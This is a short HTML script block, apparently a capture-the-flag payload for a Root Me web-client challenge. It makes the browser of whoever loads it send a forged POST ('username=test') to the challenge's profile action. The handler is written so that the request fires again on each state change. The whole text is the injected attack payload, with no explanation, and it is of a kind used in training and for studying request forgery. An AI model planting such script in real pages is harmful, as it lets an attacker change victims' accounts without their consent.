<script>
    var post_data = 'username=test';
    var xmlhttp=new XMLHttpRequest();
    xmlhttp.open("POST", 'http://challenge01.root-me.org/web-client/ch22/index.php?action=profile ', true);
    xmlhttp.onreadystatechange = function () {
        xmlhttp.send(post_data);  
    };
    xmlhttp.send(post_data);
</script>